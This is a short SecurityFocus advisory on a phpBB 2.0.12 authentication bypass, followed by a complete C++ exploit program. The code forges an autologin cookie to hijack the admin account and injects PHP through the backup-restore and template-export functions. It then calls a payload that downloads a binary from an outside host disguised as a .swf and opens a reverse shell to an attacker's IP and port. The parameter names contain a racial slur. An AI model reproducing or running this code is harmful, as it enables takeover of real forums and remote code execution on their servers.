source: http://www.securityfocus.com/bid/12678/info
  
phpBB is affected by an authentication bypass vulnerability.
  
This issue is due to the application failing to properly sanitize user-supplied input during authentication.
  
Exploitation of this vulnerability would permit unauthorized access to any known account including the administrator account.
  
The vendor has addressed this issue in phpBB 2.0.13.

/*
        coded by overdose
        slythers@gmail.com
C:\source\phpbbexp>bcc32 -c serv.cpp
Borland C++ 5.5.1 for Win32 Copyright (c) 1993, 2000 Borland
serv.cpp:
Warning W8060 serv.cpp 77: Possibly incorrect assignment in function serveur::co
nnectsocket(char *,unsigned short)

C:\source\phpbbexp>bcc32 phpbbexp.cpp serv.obj
Borland C++ 5.5.1 for Win32 Copyright (c) 1993, 2000 Borland
phpbbexp.cpp:
Turbo Incremental Link 5.00 Copyright (c) 1997, 2000 Borland

C:\source\phpbbexp>

je cherche un job au passage :>
*/
#include <iostream.h>
#include <winsock.h>

class serveur
{
        public:
                bool createsocket();
                bool listen(unsigned short port,unsigned int nbwaitconnect);
                serveur * waitconnect();
                bool connectsocket(char *dns,unsigned short port);
                bool socketsend(char *envoi);
                bool getword(char in[],unsigned int max);
                bool getword(char in2[]);
                bool getline(char buf[],unsigned int maxcara);
                bool getline(char buf2[]);
                bool ifgetchar(char *caraif);
                bool ifchargetnb(char ligne[],unsigned int aumax);
                bool ifchargetline(char ligne[],unsigned int lemax);
                bool ifchargetline(char ligne[]);
                bool getnb(char *vect,unsigned int nb);
                bool sendnb(char *vec,unsigned int longueur);
                bool isconnect();
                int getnumsock();
                void closesock();
                bool createbytheclass(int thesock,struct sockaddr_in thestruct);
                unsigned int maxread;
                unsigned int seconde;
                unsigned int microseconde;
                serveur();
                ~serveur();
                void operator << (char *chaine);
                void operator >> (char *read);

        private:
                bool connected;
                bool create;
                struct sockaddr_in mysock;
                int sock;

};


#define SHELL
"$a=fopen(\"http://img58.exs.cx/img58/1584/nc4hk.swf\",\"r\");$b=\"\";while(!feof($a)){$b%20.=%20fread($a,200000);};fclose($a);$a=fopen(\"/tmp/.sess_\",\"w\");fwrite($a,$
b);fclose($a);chmod(\"/tmp/.sess_\",0777);system(\"/tmp/.sess_%20\".$_REQUEST[niggaip].\"%20\".$_REQUEST[niggaport].\"%20-e%20/bin/sh\");"

#define HTTP_PORT 80
#define DEFAULT_COOKIE "phpbb2mysql"
#define SIGNATURE_SESSID "Set-Cookie: "
#define BOUNDARY "----------g7pEbdXsWGPB7wRFGrqA1g"
#define UP_FILE "------------g7pEbdXsWGPB7wRFGrqA1g\nContent-Disposition: form-data;
name=\"restore_start\"\n\npetass\n------------g7pEbdXsWGPB7wRFGrqA1g\nContent-Disposition: form-data;
name=\"perform\"\n\nrestore\n------------g7pEbdXsWGPB7wRFGrqA1g\nContent-Disposition: form-data; name=\"backup_file\"; filename=\"phpbb_db_backup.sql\"\nContent-Type:
text/sql\n\n"
#define UP_FILE_END "\n------------g7pEbdXsWGPB7wRFGrqA1g--\n"
#define EXP_TEMPLATES "mode=export&edit=Envoyer&export_template="
#define SIGNATURE_TABLE_NAME "DROP TABLE IF EXISTS "
#define SIGNATURE_TABLE_NAME_END "_config;"

#define SQL_TEMPLATES "DROP TABLE IF EXISTS "
#define SQL_TEMPLATES_2 "_themes;\nCREATE TABLE "
char *sql_templates_3 ="_themes("
        "themes_id mediumint(8) unsigned NOT NULL auto_increment,"
        "template_name varchar(150) NOT NULL,"
        "style_name varchar(30) NOT NULL,"
        "head_stylesheet varchar(100),"
        "body_background varchar(100),"
        "body_bgcolor varchar(6),"
        "body_text varchar(6),"
        "body_link varchar(6),"
        "body_vlink varchar(6),"
        "body_alink varchar(6),"
        "body_hlink varchar(6),"
        "tr_color1 varchar(6),"
        "tr_color2 varchar(6),"
        "tr_color3 varchar(6),"
        "tr_class1 varchar(25),"
        "tr_class2 varchar(25),"
        "tr_class3 varchar(25),"
        "th_color1 varchar(6),"
        "th_color2 varchar(6),"
        "th_color3 varchar(6),"
        "th_class1 varchar(25),"
        "th_class2 varchar(25),"
        "th_class3 varchar(25),"
        "td_color1 varchar(6),"
        "td_color2 varchar(6),"
        "td_color3 varchar(6),"
        "td_class1 varchar(25),"
        "td_class2 varchar(25),"
        "td_class3 varchar(25),"
        "fontface1 varchar(50),"
        "fontface2 varchar(50),"
        "fontface3 varchar(50),"
        "fontsize1 tinyint(4),"
        "fontsize2 tinyint(4),"
        "fontsize3 tinyint(4),"
        "fontcolor1 varchar(6),"
        "fontcolor2 varchar(6),"
        "fontcolor3 varchar(6),"
        "span_class1 varchar(25),"
        "span_class2 varchar(25),"
        "span_class3 varchar(25),"
        "img_size_poll smallint(5) unsigned,"
        "img_size_privmsg smallint(5) unsigned,"
        "PRIMARY KEY (themes_id)"
        ");";

#define SQL_FAKE_TEMPLATES "\nINSERT INTO "
#define SQL_FAKE_TEMPLATES_2 "_themes (themes_id, template_name, style_name, head_stylesheet, body_background, body_bgcolor, body_text, body_link, body_vlink,
body_alink, body_hlink, tr_color1, tr_color2, tr_color3, tr_class1, tr_class2, tr_class3, th_color1, th_color2, th_color3, th_class1, th_class2, th_class3, td_color1,
td_color2, td_color3, td_class1, td_class2, td_class3, fontface1, fontface2, fontface3, fontsize1, fontsize2, fontsize3, fontcolor1, fontcolor2, fontcolor3, span_class1,
span_class2, span_class3, img_size_poll, img_size_privmsg) VALUES(\'2\', \'"
//template_name varchar(30) NOT NULL,
#define FAKE_TEMPLATES_NAMES "aaa=12;eval(stripslashes($_REQUEST[nigga]));exit();// /../../../../../../../../../../../../../../../../../../../tmp"
#define SQL_FAKE_TEMPLATES_3 "\', \'FI Black\', \'fiblack.css\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\', \'\',
\'\', \'\', \'\', \'\', \'\', \'row1\', \'row2\', \'\', \'\', \'\', \'\', \'0\', \'0\', \'0\', \'\', \'006699\', \'ffa34f\', \'cc\', \'bb\', \'a\', \'0\', \'0\');"
#define SQL_FAKE_TEMPLATES_4 "_themes (themes_id, template_name, style_name, head_stylesheet, body_background, body_bgcolor, body_text, body_link, body_vlink,
body_alink, body_hlink, tr_color1, tr_color2, tr_color3, tr_class1, tr_class2, tr_class3, th_color1, th_color2, th_color3, th_class1, th_class2, th_class3, td_color1,
td_color2, td_color3, td_class1, td_class2, td_class3, fontface1, fontface2, fontface3, fontsize1, fontsize2, fontsize3, fontcolor1, fontcolor2, fontcolor3, span_class1,
span_class2, span_class3, img_size_poll, img_size_privmsg) VALUES(\'1\', \'subSilver\', \'subSilver\', \'subSilver.css\',\'\', \'E5E5E5\', \'000000\', \'006699\',
\'5493B4\', \'\', \'DD6900\', \'EFEFEF\', \'DEE3E7\', \'D1D7DC\', \'\', \'\', \'\', \'98AAB1\', \'006699\', \'FFFFFF\', \'cellpic1.gif\', \'cellpic3.gif\',
\'cellpic2.jpg\', \'FAFAFA\', \'FFFFFF\', \'\', \'row1\', \'row2\', \'\', \'Verdana, Arial, Helvetica, sans-serif\', \'Trebuchet MS\', \'Courier, \\\'Courier New\\\',
sans-ser
 if\', \'10\', \'11\', \'12\', \'444444\', \'006600\', \'FFA34F\', \'\', \'\', \'\', NULL, NULL);"
#define SQL_FAKE_TEMPLATES_5 "\nUPDATE "
#define SQL_FAKE_TEMPLATES_6 "_config set config_value=\"1\" where config_name=\"default_style\";"

struct url{
        char *dns;
        char *uri;
        unsigned short port;
};

struct url parseurl(char *of);
char * intostr(int erf);
void help();

int main(int argc,char *argv[])
{
        char buff[1024];
        char sid[33];
        char oct;
        char *cookiename;
        char *ptr;
        char *tablename = 0x00;
        char *phpcode = SHELL;
        bool flag;
        unsigned int longbeach;
        serveur http;
        struct url victim;
        WSAData wsadata;
        if(WSAStartup(MAKEWORD(2, 0),&wsadata) != 0)
                return 1;
        if(argc < 4)
                help();
        cookiename= DEFAULT_COOKIE;
        sid[0] = '\0';
        victim = parseurl(argv[1]);
        //detection du nom du cookie
        http.createsocket();
        if(!http.connectsocket(victim.dns,victim.port))
                return 0;
        http << "GET ";
        http << victim.uri;
        http << " HTTP/1.1\nHost: ";
        http << victim.dns;
        http << "\nReferer: ";
        http << argv[1];
        http << "\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nConnection: close\n\n";
        do{
                if(!http.getline(buff,1023))
                        buff[0] = 0x00;
                if(!strncmp(buff,SIGNATURE_SESSID,sizeof(SIGNATURE_SESSID)-1))
                {
                        ptr = buff + sizeof(SIGNATURE_SESSID)-1;
                        for(ptr; *ptr && (*ptr != '=');ptr++);
                        *ptr= '\0';
                        ptr -= 4;
                        if(!strncmp(ptr,"_sid",4))
                        {
                                *ptr = '\0';
                                ptr = buff + sizeof(SIGNATURE_SESSID)-1;
                                cookiename = new char[strlen(ptr)+1];
                                strcpy(cookiename,ptr);
                                cout << "_ nom du cookie recuperer : "<<cookiename<<endl;
                                buff[0] = '\0';
                        };
                };
        }while(buff[0]);
        http.closesock();
        http.createsocket();
        if(!http.connectsocket(victim.dns,victim.port))
                return 0;
        //faille cookie uid
        http << "GET ";
        http << victim.uri;
        http << " HTTP/1.1\nHost: ";
        http << victim.dns;
        http << "\nCookie: ";
        http << cookiename;
        http << "_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; expires=Fri, 24-Dec-2005 21:25:37 GMT; path=/;
domain=";
        http << victim.dns;
        http << "\nReferer: ";
        http << argv[1];
        http << "\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nConnection: close\n\n";
        do{
                if(!http.getline(buff,1023))
                        buff[0] = 0x00;
                if(!strncmp(buff,SIGNATURE_SESSID,sizeof(SIGNATURE_SESSID)-1))
                {
                        ptr = buff + sizeof(SIGNATURE_SESSID)-1;
                        if((!strncmp(ptr,cookiename,strlen(cookiename))) && (!strncmp(&ptr[strlen(cookiename)],"_sid=",sizeof("_sid=")-1)))
                        {
                                ptr += strlen(cookiename) + sizeof("_sid=")-1;
                                strncpy(sid,ptr,32);
                                sid[32] = '\0';
                        };
                };
        }while(buff[0]);
        if(!sid[0])
        {
                cout << "_ recuperation de l'identifiant de session a echouer"<<endl;
                return 0;
        };
        cout << "_ SESSION ID recuper? ... "<<sid<<endl<<argv[1]<<"?sid="<<sid<<endl;
        http.closesock();
        //recuperation du nom de la table
        http.createsocket();
        if(!http.connectsocket(victim.dns,victim.port))
                return 0;
        cout <<"_ recuperation du nom de la table sql ... ";
        http << "GET ";
        http << victim.uri;
        http << "admin/admin_db_utilities.php?perform=backup&additional_tables=&backup_type=structure&drop=1&backupstart=1&gzipcompress=0&startdownload=1&sid=";
        http << sid;
        http << " HTTP/1.1\nHost: ";
        http << victim.dns;
        http << "\nReferer: ";
        http << argv[1];
        http << "\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nConnection: close\n\n";
        flag = 1;
        while(flag)
        {
                flag = http.getline(buff,1023);
                if(!strncmp(buff,SIGNATURE_TABLE_NAME,sizeof(SIGNATURE_TABLE_NAME)-1))
                {
                        longbeach = strlen(buff);
                        ptr = buff + longbeach - (sizeof(SIGNATURE_TABLE_NAME_END)-1);
                        if(!strcmp(ptr,SIGNATURE_TABLE_NAME_END))
                        {
                                flag = 0;
                                *ptr= '\0';
                                ptr = buff + sizeof(SIGNATURE_TABLE_NAME) -1;
                                tablename = new char[strlen(ptr)+1];
                                strcpy(tablename,ptr);
                        };
                };
        };
        http.closesock();
        if(!tablename)
        {
                cout <<"can\'t find"<<endl;
                return 0;
        };
        cout <<tablename << " OK"<<endl;
        cout << "_ Injection de la fake templates ...";
        http.createsocket();
        if(!http.connectsocket(victim.dns,victim.port))
                return 0;
        http << "POST ";
        http << victim.uri;
        http << "admin/admin_db_utilities.php?sid=";
        http << sid;
        http << " HTTP/1.1\nHost: ";
        http << victim.dns;
        http << "\nReferer: ";
        http << argv[1];
        http << "\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nConnection: close, TE\r\nTE: deflate, chunked, identify, trailers\r\nCache-Control:
no-cache\r\nContent-Type: multipart/form-data; boundary=" BOUNDARY "\nContent-Length: ";
        http <<
intostr(strlen(sql_templates_3)+sizeof(SQL_TEMPLATES)-1+sizeof(SQL_TEMPLATES_2)-1+sizeof(SQL_FAKE_TEMPLATES)-1+strlen(tablename)+sizeof(SQL_FAKE_TEMPLATES_2)-1+sizeof(FAK
E_TEMPLATES_NAMES)-1+sizeof(SQL_FAKE_TEMPLATES_3)-1+sizeof(SQL_FAKE_TEMPLATES)-1+strlen(tablename)+sizeof(SQL_FAKE_TEMPLATES_4)-1+sizeof(SQL_FAKE_TEMPLATES_5)-1+strlen(ta
blename)+sizeof(SQL_FAKE_TEMPLATES_6)-1+sizeof(UP_FILE_END)-1+sizeof(UP_FILE));
        http << "\n\n" UP_FILE SQL_TEMPLATES;
        http << tablename;
        http << SQL_TEMPLATES_2;
        http << tablename;
        http << sql_templates_3;
        http << SQL_FAKE_TEMPLATES;
        http << tablename;
        http << SQL_FAKE_TEMPLATES_4 SQL_FAKE_TEMPLATES_5;
        http << tablename;
        http << SQL_FAKE_TEMPLATES_6 SQL_FAKE_TEMPLATES;
        http << tablename;
        http << SQL_FAKE_TEMPLATES_2 FAKE_TEMPLATES_NAMES SQL_FAKE_TEMPLATES_3 UP_FILE_END ;
        while(http.getnb(&oct,sizeof(char)));
        cout <<"OK"<<endl;
        ptr = new char[sizeof(FAKE_TEMPLATES_NAMES)];
        strcpy(ptr,FAKE_TEMPLATES_NAMES);
        for(int cpt = 0; ptr[cpt]!= '\0';cpt++)
        {
                if(ptr[cpt] == ' ')
                        ptr[cpt] = '+';
        };
        //creation de la page dans /tmp
        http.closesock();
        http.createsocket();
        if(!http.connectsocket(victim.dns,victim.port))
                return 0;
        http << "POST ";
        http << victim.uri;
        http << "admin/admin_styles.php?mode=export&sid=";
        http << sid;
        http << " HTTP/1.1\nHost: ";
        http << victim.dns;
        http << "\nReferer: ";
        http << argv[1];
        http << "admin/admin_styles.php?mode=export\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nConnection: close\nContent-Type:
application/x-www-form-urlencoded\nContent-Length: ";
        http << intostr(strlen(ptr)+sizeof(EXP_TEMPLATES)-1);
        http << "\n\n";
        http << EXP_TEMPLATES;
        http << ptr;
        while(http.getnb(&oct,sizeof(char)));
        cout << "_ Fichier cr?e"<<endl;
        //appelle de la page avec le code php
        http.closesock();
        http.createsocket();
        if(!http.connectsocket(victim.dns,victim.port))
                return 0;
        http << "GET ";
        http << victim.uri;
        http << "admin/admin_styles.php?mode=addnew&install_to=../../../../../../../../../../../../../../../../../../../tmp&sid=";
        http << sid;
        http << "&niggaip=";
        http << argv[2];
        http << "&niggaport=";
        http << argv[3];
        http << "&nigga=";
        http << phpcode;
        http << " HTTP/1.1\nHost: ";
        http << victim.dns;
        http << "\nReferer: ";
        http << argv[1];
        http << "\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nConnection: close\n\n";
        while(http.getnb(&oct,sizeof(char)));
        cout << "_ Code
execut?"<<endl<<argv[1]<<"admin/admin_styles.php?mode=addnew&install_to=../../../../../../../../../../../../../../../../../../../tmp&nigga=phpinfo();&sid="<<sid<<endl;
        delete[] ptr;
        return 0;
}

struct url parseurl(char *of)
{
        struct url retour;
        unsigned int taille;
        char tmp;
        retour.dns = 0x00;
        retour.uri = 0x00;
        retour.port = HTTP_PORT ;
        while( *of && (*of != ':'))
                of++;
        if(*of && *(of+1) && *(of+2))
        {
                if((*(of+1) != '/') || (*(of+2) != '/'))
                        return retour;
                of += 3;
                for(taille = 0; (of[taille] != '/') && (of[taille] != '\0') && (of[taille] != ':');taille++);
                retour.dns = new char [taille+1];
                memcpy(retour.dns,of,taille);
                retour.dns[taille] = '\0';
                of += taille;
                if(*of == ':')
                {
                        of++;
                        for(taille = 0; (of[taille] != '/') && (of[taille] != '\0');taille++);
                        tmp = of[taille];
                        of[taille] = '\0';
                        if(taille)
                                retour.port = atoi(of);
                        of[taille] = tmp;
                        of += taille;
                };
                if(!*of)
                {
                        retour.uri = new char[2];
                        strcpy(retour.uri,"/");
                }
                else
                {
                        retour.uri = new char [strlen(of)+1];
                        strcpy(retour.uri,of);
                };
        };
        return retour;
}

char * intostr(int erf)
{
        char *chaine;
        int puissance;
        int erf2;
        if( erf >= 0)
        {
                puissance =0;
                for(int kekette = 1;kekette<=erf;kekette = kekette*10)
                {
                        puissance++;
                };
                if (puissance == 0)
                {
                        puissance = 1;
                };
                chaine = new char[puissance+1];
                chaine[puissance] ='\0';
                for(int arf = puissance-1;arf >=0;arf--)
                {
                        erf2 = erf % 10 ;
                        chaine[arf] = '0' + erf2;
                        erf = erf /10;
                };
                return chaine;
        }
        else
                return 0;
}

void help()
{
        cout << "phpbbexp.exe http://site.com/phpbb/ [backshell ip] [backshell port]"<<endl;
        cout << "coded by Malloc(0) Wicked Attitude"<<endl;
        cout << "phpbb <= 2.0.12 uid vuln + admin_styles.php exploit"<<endl;
        exit(0);
}

bool serveur::createsocket()
{
        if (create)
                return 0;
        sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sock <0)
        {
                create = 0;
                return 0;
        };
        create = 1;
        return sock;
}

bool serveur::listen(unsigned short port, unsigned int nbwaitconnect)
{
        int test;
        memset(&mysock, 0, sizeof(mysock));
        mysock.sin_family = AF_INET ;
        mysock.sin_addr.s_addr = htonl(INADDR_ANY);
        mysock.sin_port = htons(port);
        test = bind(sock,(sockaddr *) &mysock,sizeof(mysock));
        if (test <0)
        {
                closesock();
                return 0;
        };
        listen(sock,nbwaitconnect);
        return 1;
}

serveur * serveur::waitconnect()
{
        struct sockaddr_in astruct;
        int taille;
        int asock;
        serveur * newsock ;
        taille = sizeof(astruct);
        asock = accept(sock, (sockaddr *) &astruct,&taille);
        newsock = new serveur ;
        newsock->createbytheclass(asock,astruct);
        return newsock;
}

bool serveur::connectsocket(char *dns,unsigned short port)
{
        struct hostent *hoste;
        int test;
        memset(&mysock, 0, sizeof(mysock));
        if(!(hoste = gethostbyname(dns)))
                mysock.sin_addr.s_addr = inet_addr(dns);
        else
                memcpy(&(mysock.sin_addr),hoste->h_addr,hoste->h_length);
        mysock.sin_family = AF_INET ;
        mysock.sin_port = htons(port);
        test = connect(sock,(struct sockaddr *) &mysock , sizeof(mysock));
        if(test <0)
                return 0;
        connected = 1;
        return 1;
};

bool serveur::socketsend(char *envoi)
{
        int veri;
        int taiverif;
        if(!connected)
                return 0;
        veri = strlen(envoi);
        taiverif = send(sock,envoi,veri,0);
        if(veri != taiverif)
        {
                connected = 0;
                return 0;
        };
        return 1;
}

bool serveur::getline(char buf[],unsigned int maxcara)
{
        unsigned int testing;
        unsigned int curseur;
        char recoi;
        if(!connected)
                return 0;
        curseur = 0;
        do{
                testing = recv(sock,&recoi,sizeof(char),0);
                if(testing != sizeof(char))
                {
                        buf[curseur] = '\0' ;
                        connected = 0;
                        return 0;
                };
                if( curseur == maxcara)
                {
                        buf[curseur] = '\0';
                };
                if ((curseur < maxcara)&&(recoi != '\r')&&(recoi != '\n'))
                {
                        buf[curseur] = recoi ;
                        curseur++ ;
                };
        }while(recoi != '\n' );
        buf[curseur] = '\0' ;
        return 1;
}

bool serveur::getline(char buf2[])
{
        return getline(buf2,maxread);
}

bool serveur::getword(char in[],unsigned int max)
{
        int testing;
        unsigned int curseur;
        char recoi;
        if(!connected)
                return 0;
        curseur = 0;
        do{
                testing = recv(sock,&recoi,sizeof(char),0);
                if(testing != sizeof(char))
                {
                        in[curseur] = '\0' ;
                        connected = 0;
                        return 0;
                };
                if( curseur == max)
                {
                        in[curseur] = '\0';
                };
                if ((curseur < max)&&(recoi != '\r')&&(recoi != '\n')&&(recoi != ' '))
                {
                        in[curseur] = recoi ;
                        curseur++ ;
                };
        }while((recoi != '\n') && (recoi != ' '));
        in[curseur] = '\0' ;
        return 1;
}

bool serveur::getword(char in2[])
{
        return getword(in2,maxread);
}

bool serveur::ifgetchar(char *caraif)
{
        fd_set fdens;
        struct timeval tv;
        tv.tv_sec = seconde ;
        tv.tv_usec = microseconde ;
        FD_ZERO(&fdens);
        FD_SET(sock,&fdens);
        select(sock+1, &fdens, NULL, NULL, &tv);
        if(FD_ISSET(sock,&fdens))
        {
                if(!getnb(caraif,sizeof(char)))
                        closesock();
                return connected;
        }
        else
        {
                return 0;
        };
}

bool serveur::ifchargetnb(char ligne[],unsigned int aumax)
{
        bool retour;
        retour = ifgetchar(ligne) ;
        if(retour)
        {
                connected = getnb(ligne,aumax) ;
        };
        return retour;
}

bool serveur::ifchargetline(char ligne[],unsigned int lemax)
{
        bool retour;
        retour = ifgetchar(ligne) ;
        if(retour)
        {
                if(!(*ligne))
                        return 1;
                if(*ligne == '\n')
                {
                        *ligne = '\0';
                        return 1;
                };
                if(*ligne != '\r')
                {
                        ligne++;
                        lemax--;
                };
                connected = getline(ligne,lemax) ;
        };
        return retour;
}

bool serveur::ifchargetline(char ligne[])
{
        return ifchargetline(ligne,maxread);
}

bool serveur::getnb(char *vect,unsigned int nb)
{
        unsigned int testing;
        unsigned int curseur;
        char recoi;
        if(!connected)
                return 0;
        curseur = 0;
        do{
                testing = recv(sock,&recoi,sizeof(char),0);
                if(testing != sizeof(char))
                {
                        vect[curseur] = '\0' ;
                        connected = 0;
                        return 0;
                };
                if( curseur == nb)
                {
                        vect[curseur] = '\0';
                };
                if (curseur < nb)
                {
                        vect[curseur] = recoi ;
                        curseur++ ;
                };
        }while(curseur < nb);
        return 1;
}

bool serveur::sendnb(char *vec,unsigned int longueur)
{
        int taiverif;
        if(!connected)
                return 0;
        taiverif = send(sock,vec,longueur,0);
        if((int)longueur != taiverif)
        {
                connected = 0;
                return 0;
        };
        return 1;
}

int serveur::getnumsock()
{
        return sock;
}

bool serveur::createbytheclass(int thesock,struct sockaddr_in thestruct)
{
        if(create)
                return 0;
        sock = thesock ;
        memcpy(&mysock,&thestruct,sizeof(thestruct));
        create = 1;
        connected = 1;
        return 1;
}

void serveur::closesock()
{
        if(create)
        {
                closesocket(sock);
                create = 0;
                connected = 0;
        };
}

bool serveur::isconnect()
{
        return connected;
}

void serveur::operator << (char *chaine)
{
        socketsend(chaine);
}

void serveur::operator >> (char *read)
{
        getword(read);
}

serveur::serveur()
{
        connected = 0;
        create = 0 ;
        maxread = 0xFFFFFFFF ;
        seconde = 0;
        microseconde = 0;
        createsocket();
}

serveur::~serveur()
{
        if(connected)
                closesock();
}